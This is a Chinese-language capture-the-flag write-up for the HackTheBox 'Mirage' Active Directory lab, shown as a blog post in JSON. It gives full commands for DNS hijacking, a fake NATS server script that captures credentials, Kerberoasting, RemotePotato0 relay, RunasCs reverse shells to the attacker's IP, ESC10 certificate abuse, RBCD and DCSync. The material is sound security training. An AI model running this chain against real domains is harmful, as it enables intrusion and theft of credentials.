{
  "id": 1760068537531,
  "title": "HackTheBox Mirage",
  "slug": "htb-mirage",
  "date": "2025-09-04",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1756977887446-26a69278-c834-4664-a51a-63f67f1c9b91.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">nmap -T4 -v -A -Pn 10.10.11.78 -oN Mirage/mirage.txt\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1756978412062-155d2865-445c-49c5-9652-d4d8731bd891.png\" alt=\"\"></p>\n<h1>user</h1>\n<p>真的没有东西，扫一下 udp 端口</p>\n<pre><code class=\"language-bash\">nmap -T4 -v -A -Pn -sU --min-rate=2000 10.10.11.78 \n</code></pre>\n<p>udp 太慢了，要增加一下发包速度--min-rate=2000</p>\n<p>然后扫出来的端口再重新用服务探测跑一遍</p>\n<pre><code class=\"language-bash\">nmap -p53,88,111,123,389,2049 -sU -sCV 10.10.11.78 -oN mirage_udp.txt\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757006384297-1a72c775-3101-4a39-8fb6-7c8f0a8733aa.png\" alt=\"\"></p>\n<h2>NFS</h2>\n<p>可以看到 2049 有 nfs 服务，看下是否有泄露</p>\n<pre><code class=\"language-bash\">showmount -e 10.10.11.78\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757006521932-a7ed0e64-a9d2-4e06-bc6a-fb0ef8a322ab.png\" alt=\"\"></p>\n<p>mount 挂载到本地新建目录，发现俩 pdf</p>\n<pre><code class=\"language-bash\">mount -t nfs 10.10.11.78:/MirageReports nfs_test\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757006807566-5af9b043-937b-4835-814e-8fd6cffba642.png\" alt=\"\"></p>\n<p>cp 出来，完事后记得断一下挂载</p>\n<pre><code class=\"language-bash\">umount 10.10.11.78:/MirageReports\n</code></pre>\n<p>看了一下两份安全报告</p>\n<p>1、nats-svc.mirage.htb 的 dns 记录丢失</p>\n<p>2、准备弃用 NTLM 认证，转为全面 kerberos 认证</p>\n<p>没有了 nats 的 dns，那我们可以进行 dns 劫持，来获取别人请求 nats 服务器时候的认证信息</p>\n<h2>NATS</h2>\n<p>nsupdate 先更新域内的 dns 记录</p>\n<pre><code class=\"language-bash\">└─# nsupdate                                          \n&gt; server 10.10.11.78\n&gt; update add nats-svc.mirage.htb 3600 A 10.10.14.11\n&gt; send\n</code></pre>\n<p>这个时候如果我们监听 4222 端口，是可以看到有域内的请求</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757100627617-332df7fa-7ff3-4138-87bf-1a1fe1fe4602.png\" alt=\"\"></p>\n<p>我们需要一个脚本伪造一个 nats 服务端，发回一个 info 信息。才会再次发来认证信息</p>\n<pre><code class=\"language-bash\">import socket\n\nHOST = &quot;0.0.0.0&quot;   # 监听所有地址\nPORT = 4222        # NATS 默认端口\n\nprint(f&quot;[+] Fake NATS Server listening on {HOST}:{PORT}&quot;)\n\n# 创建 TCP 套接字\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((HOST, PORT))\ns.listen(5)\n\nwhile True:\n    try:\n        client, addr = s.accept()\n        print(f&quot;[+] Connection from {addr}&quot;)\n\n        # 发送伪造的 INFO 消息 —— NATS 客户端握手时必须的\n        info = b&#39;INFO {&quot;server_id&quot;:&quot;FAKE&quot;,&quot;version&quot;:&quot;2.11.0&quot;,&quot;auth_required&quot;:true}\\r\\n&#39;\n        client.sendall(info)\n\n        # 接收客户端可能发送的认证信息\n        data = client.recv(2048)\n        print(&quot;[&gt;] Received:&quot;)\n        print(data.decode(errors=&#39;replace&#39;))\n\n        # 可选：回复错误消息 或者直接关闭连接\n        # client.sendall(b&#39;-ERR &quot;Authorization Violation&quot;\\r\\n&#39;)\n\n        client.close()\n    except Exception as e:\n        print(f&quot;[!] Error: {e}&quot;)\n</code></pre>\n<p>再次更新一下 dns 记录，就能收到回连的认证信息了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757052198573-bd995883-780b-4b42-a2f3-5b173d671bf2.png\" alt=\"\"></p>\n<p>&quot;user&quot;:&quot;Dev_Account_A&quot;,&quot;pass&quot;:&quot;hx5h7F5554fP@1337!&quot;</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757052298081-aac35155-a577-4ddd-8864-64b89aac7e32.png\" alt=\"\"></p>\n<p>更新一下 krb5.conf</p>\n<p>这个账号 ntlm 认证和请求票据都不行。试试用来请求真正的 nats 服务</p>\n<p>查询 nats 服务存储的信息</p>\n<pre><code class=\"language-bash\">./nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password hx5h7F5554fP@1337! stream ls\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757053248879-c1c388ba-fc7c-46a9-a9f6-bf0454d51e25.png\" alt=\"\"></p>\n<p>新建一个消费者用来拉信息</p>\n<pre><code class=\"language-bash\">./nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password hx5h7F5554fP@1337! consumer add auth_logs pull --pull --ack explicit\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757053357553-e73e973c-448d-4bd6-8d78-36e5ec743bab.png\" alt=\"\"></p>\n<p>用 pull 消费者拉去5 条信息，看到了一个账户信息在里面</p>\n<pre><code class=\"language-bash\">./nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password hx5h7F5554fP@1337! consumer next auth_logs pull --count=5\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757053438435-89af16af-f4c6-4600-ae79-456f4edd8b56.png\" alt=\"\"></p>\n<p>&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;</p>\n<p>请求票据来认证，成功</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757053597673-d3747803-8a9e-48ab-9cf8-a313f30d83d1.png\" alt=\"\"></p>\n<p>bloodhound 跑一下域内环境</p>\n<pre><code class=\"language-bash\">bloodhound-python -d mirage.htb -ns 10.10.11.78 -u &#39;david.jjackson&#39; -p &#39;pN8kQmn6b86!1234@&#39; -k -c All --zip\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757053688242-39f7f6c5-9955-4060-b4db-c32b84cf14cf.png\" alt=\"\"></p>\n<p>NATHAN.AADAM</p>\n<p>nathan.aadam 可以请求票据，同时还有 spn，可以用作 kerberoasting</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757054553958-7f9cdac5-0c96-4c0e-add7-910c50456f8b.png\" alt=\"\"></p>\n<h2>kerberoasting</h2>\n<pre><code class=\"language-bash\">python /home/kali/Tool/targetedKerberoast/targetedKerberoast.py -v -d &#39;mirage.htb&#39; --dc-host &#39;dc01.mirage.htb&#39; -u &#39;david.jjackson&#39; -k\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757054756676-fca2e32c-7913-4dcd-8907-99a42f7b9810.png\" alt=\"\"></p>\n<p>hashcat 离线爆破  nathan.aadam：3edc#EDC3</p>\n<pre><code class=\"language-bash\">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --show\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757055113006-5f089ae9-720e-40bd-8326-c42d14abd849.png\" alt=\"\"></p>\n<p>重新票据认证一下</p>\n<pre><code class=\"language-bash\">impacket-getTGT mirage.htb/&#39;nathan.aadam&#39;:&#39;3edc#EDC3&#39;\nexport KRB5CCNAME=nathan.aadam.ccache\nnxc ldap mirage.htb -u &#39;nathan.aadam&#39; -p &#39;3edc#EDC3&#39; -k\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757055292510-51ff32e8-f17d-4d9c-913e-2b8f6e43ce09.png\" alt=\"\"></p>\n<p>回到 bloodhound 分析一下nathan.aadam</p>\n<p>属于 remote managerment users 组，可以远程登录</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757055404728-30f4f47b-4a9f-46fb-a945-9b6b6ec34d35.png\" alt=\"\"></p>\n<p>直接 evil-winrm 登录</p>\n<pre><code class=\"language-bash\">evil-winrm -i dc01.mirage.htb -r mirage.htb -k nathan.aadam.ccache\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757055659691-2a4140f8-4baf-472f-bd18-691244bdc132.png\" alt=\"\"></p>\n<p>到桌面就可以看到 user.txt 了</p>\n<h1>ROOT</h1>\n<h2>AutoLogon</h2>\n<p>没找到东西了，上传一个 winpeas.exe 跑一下，</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757058252415-2a8aa5f6-fbc2-451a-9a62-1fca383127af.png\" alt=\"\"></p>\n<p>这里有 mark.bbond 的自动登录凭证，但是查看不到 pass</p>\n<p>可以用中继加强制认证来获取这个 pass，但是是本地 PetitPotam  行不通的，但是有这个RemotePotato0</p>\n<p><a href=\"https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2\">https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2</a></p>\n<p>这里要看一下 mark 的 session id，但是 query 在 powershell 里行不通，可以传 runascs 切换成 cmd 来运行</p>\n<pre><code class=\"language-bash\">.\\RunasCs.exe nathan.aadam 3edc#EDC3 cmd.exe -r &lt;ip&gt;:&lt;port&gt;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757100513852-47c57aca-dfe0-481d-ab6d-30162c97ba56.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757059871868-8ad6523e-9fba-4b23-8046-7c32edc1bef1.png\" alt=\"\"></p>\n<p>然后查看一下 session id</p>\n<pre><code class=\"language-bash\">query session\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757059909743-6e4db6c3-1709-4440-993f-c61282a58409.png\" alt=\"\"></p>\n<p>直接执行 remotepotato 是不行的，要本地转发一下端口到目标 ip</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757060252188-3543782c-2268-4661-b089-b44c1b65810e.png\" alt=\"\"></p>\n<p>kali 本地监听 135 端口，转发到目标的 9999 端口</p>\n<p>然后靶机指定到我们的 ip 就可以了</p>\n<pre><code class=\"language-bash\">socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999\n\n.\\RemotePotato0.exe -m 2 -s 1 -x &lt;ip&gt; -p 9999\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757060514182-1d0ed943-86db-4f75-9d2a-cae79af32a14.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757060506816-f9958cb8-ba63-4ce6-822c-a5a62b179733.png\" alt=\"\"></p>\n<p>拿到 ntlmv2 hash 之后进行破解</p>\n<pre><code class=\"language-bash\">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757060610135-402c9877-ec58-458a-9578-3bfb9111228a.png\" alt=\"\"></p>\n<p>MARK.BBOND：1day@atime</p>\n<p>再光顾一下 bloodhound</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757060686363-cfae5b28-a4e4-4d14-afa5-b505f22ea4d5.png\" alt=\"\"></p>\n<h2>forcechangepassword</h2>\n<p>属于 IT_SUPPORT，可以修改 javier.mmarshall</p>\n<p>先请求票据获取 mark 的权限</p>\n<pre><code class=\"language-bash\">impacket-getTGT mirage.htb/&#39;mark.bbond&#39;:&#39;1day@atime&#39;\nexport KRB5CCNAME=mark.bbond.ccache \nnxc ldap 10.10.11.78 -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; -k\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757061038226-659d2c40-c359-4442-95fd-0722e118b1be.png\" alt=\"\"></p>\n<p>直接开始修改密码</p>\n<pre><code class=\"language-bash\">bloodyAD --host &quot;dc01.mirage.htb&quot; -d &quot;mirage.htb&quot; --kerberos --dc-ip 10.10.11.78 -u &quot;mark.bbond&quot; -p &#39;1day@atime&#39; set password &quot;javier.mmarshall&quot; &#39;Admin@123456&#39;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757061084065-c298551e-e63a-4e11-ae1a-7a80b794c4bb.png\" alt=\"\"></p>\n<p>然后获取票据再来一套</p>\n<pre><code class=\"language-bash\">impacket-getTGT dc01.mirage.htb/&#39;javier.mmarshall&#39;:&#39;Admin@123456&#39;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757061236311-74296aa0-bc97-4f30-b63e-e8f1faf3be69.png\" alt=\"\"></p>\n<p>返回没办法认证，估计被禁用了，到 bloodhound 看一眼</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757061415644-114972bc-fd6c-4be6-a49e-eeb57fbcab99.png\" alt=\"\"></p>\n<p>确实，那要复活了，用mark.bbond 账户恢复</p>\n<pre><code class=\"language-bash\">Enable-ADAccount -Identity &quot;javier.mmarshall&quot;\n</code></pre>\n<p>用nathan.aadam 的权限跑 runascs 指定 mark.bbond 凭证</p>\n<p>先拿到 mark 的 shell，然后就可以操作这个了（指定 powershell.exe）</p>\n<pre><code class=\"language-bash\">.\\RunasCs.exe mark.bbond 1day@atime powershell.exe -r 10.10.14.11:5567\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757100791102-52dfa6fb-eea6-46aa-820f-6607d641c957.png\" alt=\"\"><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757100712107-174cfbe9-b7cb-468a-8e1d-ccb010c49f65.png\" alt=\"\"></p>\n<p>验证一下</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757062346490-fd560042-647d-4001-a4a3-16bdd966cd4a.png\" alt=\"\"></p>\n<p>但是 logon hours allowed 是 null，没有设置登录时间，所以 impacket-tgt 还是不行。</p>\n<p>有一个办法</p>\n<p><a href=\"https://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/\">https://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/</a></p>\n<p>但是我比较懒，直接用 mark 的权限清除了登录时间限制</p>\n<pre><code class=\"language-bash\">Set-ADUser -Identity &quot;javier.mmarshall&quot; -Clear logonHours\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757062535188-9a4b5693-25ac-4c2a-b483-96d3fa640eb6.png\" alt=\"\"></p>\n<p>重新跑一遍 kerberos 一条龙，出来了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757062627922-de2a7eea-ab41-4457-86ad-7dd517be42e0.png\" alt=\"\"></p>\n<h2>ReadGMSAPassword</h2>\n<p>三顾 bloodhound</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757062753467-94f4dc86-2944-42a7-a4df-df0dd37c466b.png\" alt=\"\"></p>\n<p>readgmsapassword 可以用gMSADumper 来</p>\n<pre><code class=\"language-bash\">python gMSADumper.py -k -d mirage.htb -l dc01.mirage.htb\n</code></pre>\n<p>抽象了，这里/etc/hosts 里把 dc01 放前面就可以了，整了半天。。。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757067528492-4c8711eb-84f0-4f13-9248-e501152dc076.png\" alt=\"\"></p>\n<p>Mirage-Service$:::7a77d15fb5a4b7035ef2524b1cc4142f</p>\n<pre><code class=\"language-bash\">impacket-getTGT mirage.htb/&#39;Mirage-Service$&#39; -hashes &#39;:7a77d15fb5a4b7035ef2524b1cc4142f&#39; -k\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757068941324-01534881-324f-4e21-ac5d-56a0e8812e5e.png\" alt=\"\"></p>\n<p>跑 nxc 的时候发现了域内证书服务器</p>\n<pre><code class=\"language-bash\">nxc ldap 10.10.11.78 -u &#39;Mirage-Service$&#39; -H &#39;7a77d15fb5a4b7035ef2524b1cc4142f&#39; -k -M adcs\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757069068150-6aa52eb8-114f-4829-8c3e-0d5b90cd3085.png\" alt=\"\"></p>\n<p>certipy-ad 跑一下，没跑到</p>\n<pre><code class=\"language-bash\">certipy-ad find -vulnerable -k -target &#39;dc01.mirage.htb&#39; -dc-ip &#39;10.10.11.78&#39;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757069671949-2ec25385-61e7-41a8-93fd-3a045ef1339f.png\" alt=\"\"></p>\n<h2>ESC10</h2>\n<p>bloodhound 暂时看不到其他可利用</p>\n<p>bloodyAD 看一下用户对哪些的可写权限，对 mark 有</p>\n<pre><code class=\"language-bash\">bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k get writable\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757096209250-dc9563c8-fb7a-4f48-9e67-4ad58567da28.png\" alt=\"\"></p>\n<p>详细看一下</p>\n<pre><code class=\"language-bash\">bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k get writable --otype USER --right WRITE --detail\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757096370658-780a7fca-e114-4be3-a846-1411e1481abe.png\" alt=\"\"></p>\n<p>可以修改 SPN 和 UPN，可以用 ESC10。有证书服务器是有道理的</p>\n<p><a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</a></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757096990266-05155a96-e4ae-4c65-a2a6-d00a0c50e8a3.png\" alt=\"\"></p>\n<p>certipy-ad 查询不到，对位了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757097116133-c269ef69-ddb1-4606-bf6c-6fc12a3d1781.png\" alt=\"\"></p>\n<p>注册表检查</p>\n<pre><code class=\"language-bash\">reg query &#39;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL&#39;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757097327693-e7eb3582-6dcd-48a0-8d46-7c8006a8dcc5.png\" alt=\"\"></p>\n<p>此键的 DWORD 值包含位标志 <code>0x4</code>，满足先决条件</p>\n<p>读取 mark 原始 upn：<a href=\"mailto:mark.bbond@mirage.htb\">mark.bbond@mirage.htb</a></p>\n<pre><code class=\"language-bash\">certipy-ad account -u &#39;mirage-service$@mirage.htb&#39; -hashes &quot;:7a77d15fb5a4b7035ef2524b1cc4142f&quot; -k -target dc01.mirage.htb -dc-ip &#39;10.10.11.78&#39; -user &#39;mark.bbond&#39; read\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757097671020-97063695-6707-4834-a3c7-25a37a786650.png\" alt=\"\"></p>\n<p>将 mark 的 upn 更新为 dc 的 upn</p>\n<pre><code class=\"language-bash\">certipy-ad account -u &#39;mirage-service$@mirage.htb&#39; -hashes &quot;:7a77d15fb5a4b7035ef2524b1cc4142f&quot; -k -target dc01.mirage.htb -dc-ip &#39;10.10.11.78&#39; -user &#39;mark.bbond&#39; -upn &#39;dc01$@mirage.htb&#39; update\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757097872220-5b928e8c-3cc8-4240-8a6a-071f7fcef185.png\" alt=\"\"></p>\n<p>重新获取 mark 的凭证并导入 ccache</p>\n<pre><code class=\"language-bash\">impacket-getTGT mirage.htb/&#39;mark.bbond&#39;:&#39;1day@atime&#39;\nexport KRB5CCNAME=mark.bbond.ccache\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757098011470-3cde774f-59c8-4688-99e4-cd588e6e29f3.png\" alt=\"\"></p>\n<p>以 mark 身份请求证书</p>\n<pre><code class=\"language-bash\">certipy-ad req -k -target &#39;dc01.mirage.htb&#39; -dc-ip &#39;10.10.11.78&#39; -ca &#39;mirage-DC01-CA&#39; -template &#39;User&#39;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757098150341-d33f2967-06c2-4e17-ab8a-c9428b51cf3d.png\" alt=\"\"></p>\n<p>将 mark 的 upn 恢复到原始值</p>\n<pre><code class=\"language-bash\">certipy-ad account -u &#39;mirage-service$@mirage.htb&#39; -hashes &quot;:7a77d15fb5a4b7035ef2524b1cc4142f&quot; -k -target dc01.mirage.htb -dc-ip &#39;10.10.11.78&#39; -user &#39;mark.bbond&#39; -upn &#39;mark.bbond@mirage.htb&#39; update\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757098248724-c0335690-16c3-46f8-8a1e-8099ab505a25.png\" alt=\"\"></p>\n<p>使用证书向 LDAPS 进行身份验证，作为目标 DC</p>\n<pre><code class=\"language-bash\">certipy-ad auth -pfx &#39;dc01.pfx&#39; -dc-ip &#39;10.10.11.78&#39; -ldap-shell\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757098337963-74184144-0800-44ba-8610-7adde3f9fb9c.png\" alt=\"\"></p>\n<p>还正好给我们提供了下一步思路</p>\n<h2>RBCD</h2>\n<p>设置dc01$的 msDS-AllowedToActOnBehalfOfOtherIdentity  为mirage-service$</p>\n<p>这样mirage-service$就可以伪造任意用户来访问 dc01$</p>\n<pre><code class=\"language-bash\">set_rbcd dc01$ mirage-service$\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757098840650-6bcc8f75-edaf-4ea2-9bd5-0260aa418348.png\" alt=\"\"></p>\n<p>用户用 upn 格式</p>\n<pre><code class=\"language-bash\">impacket-getST -spn cifs/dc01.mirage.htb -impersonate &#39;dc01$&#39; -dc-ip 10.10.11.78 &#39;mirage.htb/mirage-service$&#39; -hashes &quot;:7a77d15fb5a4b7035ef2524b1cc4142f&quot; -k\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757099137991-d2e16c8d-cb49-4b99-a2a2-17d0947a3854.png\" alt=\"\"></p>\n<h2>DCSync</h2>\n<p>有了 st，就可以用来 dcsync 获取域内所有 hash 了</p>\n<p>导入票据再导 hash</p>\n<pre><code class=\"language-bash\">export KRB5CCNAME=&#39;dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache&#39;\nimpacket-secretsdump mirage.htb/&#39;dc01$&#39;@&#39;dc01.mirage.htb&#39; -k -no-pass\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757099379308-de71dd24-1b91-4ca7-bb76-7d334218fba9.png\" alt=\"\"></p>\n<p>administrator：7be6d4f3c2b9c0e3560f5a29eeb1afb3</p>\n<p>获取 tgt，登录</p>\n<pre><code class=\"language-bash\">impacket-getTGT mirage.htb/&#39;administrator&#39; -hashes &#39;:7be6d4f3c2b9c0e3560f5a29eeb1afb3&#39;\nexport KRB5CCNAME=&#39;administrator.ccache&#39;\nevil-winrm -i dc01.mirage.htb -r mirage.htb -k administrator.ccache\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757099552207-21e876b2-e89d-462f-99df-1d411ed12298.png\" alt=\"\"></p>\n<p>就可以拿到 root.txt 了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757099622505-23aaaec6-1e80-4084-8e87-b17793ebfba3.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757099677075-ae321c95-e9af-474d-8da7-350ca370c5ad.png\" alt=\"\"></p>\n"
}